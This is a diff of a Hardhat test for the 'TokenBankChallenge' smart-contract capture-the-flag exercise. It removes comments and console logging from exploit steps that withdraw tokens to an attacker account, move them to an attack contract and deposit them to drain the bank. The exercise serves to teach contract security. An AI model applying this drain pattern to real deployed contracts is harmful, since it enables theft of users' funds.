@@ -43,15 +43,12 @@ describe('TokenBankChallenge', () => {
 
     let tx;
 
-    // Withdraw tokens: Bank -> Attacker EOA
     tx = await target.connect(attacker).withdraw(tokens);
     await tx.wait();
 
-    // Transfer tokens: Attacker EOA -> Attacker Contract
     tx = await token.connect(attacker)["transfer(address,uint256)"](attackContract.address, tokens);
     await tx.wait();
 
-    // Deposit tokens: Attacker Contract -> Bank
     tx = await attackContract.connect(attacker).deposit();
     await tx.wait();
 
@@ -60,11 +57,8 @@ describe('TokenBankChallenge', () => {
 
     const decimals = BigNumber.from(10).pow(18);
     const bankContractBalance = await token.balanceOf(target.address);
-    console.log("bankContractBalance", bankContractBalance.div(decimals));
     const attackContractBalance = await token.balanceOf(attackContract.address);
-    console.log("attackContractBalance", attackContractBalance.div(decimals));
     const attackerBalance = await token.balanceOf(attacker.address);
-    console.log("attackerBalance", attackerBalance.div(decimals));
 
     expect(await target.isComplete()).to.be.true;
 
